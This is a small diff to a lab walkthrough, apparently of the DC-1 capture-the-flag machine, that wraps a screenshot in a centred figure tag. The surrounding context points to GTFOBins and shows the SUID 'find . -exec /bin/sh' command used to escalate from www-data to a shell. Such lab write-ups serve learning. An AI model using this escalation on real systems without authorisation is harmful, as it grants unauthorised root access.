@@ -231,7 +231,9 @@ We can now use on of these files to escalate our privilege.
 
 Let's go to [GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid) to search for an exploit for the `find` utility. 
 
+<figure style={{ textAlign: 'center' }}>
 ![1](https://github.com/user-attachments/assets/8ae5500a-410b-43a1-96cb-2752538250da?raw=1)
+</figure>
 
 ```
 www-data@DC-1:/home/flag4$ find . -exec /bin/sh \; -quit
